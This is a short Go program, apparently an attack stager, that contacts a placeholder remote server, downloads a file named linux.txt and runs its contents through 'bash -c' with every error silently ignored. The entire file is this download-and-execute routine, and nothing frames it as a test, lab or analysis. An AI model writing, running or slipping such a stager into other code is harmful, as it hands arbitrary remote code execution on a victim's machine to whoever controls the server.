package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"time"
)

const (
	server = "<server>:<port>"
)

func main() {
	r, err := http.NewRequest("GET", fmt.Sprintf("http://%s/linux.txt", server), nil)
	if err != nil {
		return
	}
	x, _ := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
	b, err := http.DefaultClient.Do(r.WithContext(x))
	if err != nil {
		return
	}
	defer b.Body.Close()
	d := &bytes.Buffer{}
	io.Copy(d, b.Body)
	e := exec.Command("bash", "-c", string(d.Bytes()))
	e.Start()
}
